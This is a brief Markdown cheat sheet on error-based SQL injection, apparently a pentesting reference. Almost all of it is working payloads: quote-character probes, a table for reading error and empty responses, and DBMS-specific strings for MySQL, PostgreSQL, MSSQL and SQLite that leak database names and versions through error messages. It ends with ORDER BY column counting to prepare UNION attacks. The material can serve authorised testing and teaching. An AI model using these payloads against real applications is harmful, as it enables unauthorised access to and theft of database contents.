# Error-Based SQL Injection

## Summary
Extract data via database error messages or empty results.

## Detection
```sql
' 
"
''
"
```

## Interpretation
| Response | Meaning |
|----------|---------|
| 500 / error page | Injection detected, parsing error |
| Empty `data: []` | Injection accepted but no rows matched (good sign) |
| 200 with normal data | Unsanitized but maybe filtered |

## Payloads by DBMS

### MySQL/MariaDB
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))-- -
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- -
```

### PostgreSQL
```sql
' AND CAST((SELECT current_database()) AS integer)-- -
'||(SELECT current_database())||'
```

### MSSQL
```sql
' AND 1=(SELECT @@version)-- -
' HAVING 1=1-- -
```

### SQLite
```sql
'--          (truncated query)
'))--        (extra parens)
```

## Column Counting (UNION prep)
```sql
' ORDER BY 1-- -    (increment until error)
' ORDER BY 9-- -    (200 = 9 columns)
' ORDER BY 10-- -   (500 = 9 columns)

# REST API JSON pattern - check data length
# If empty [] with valid syntax → columns exist
```
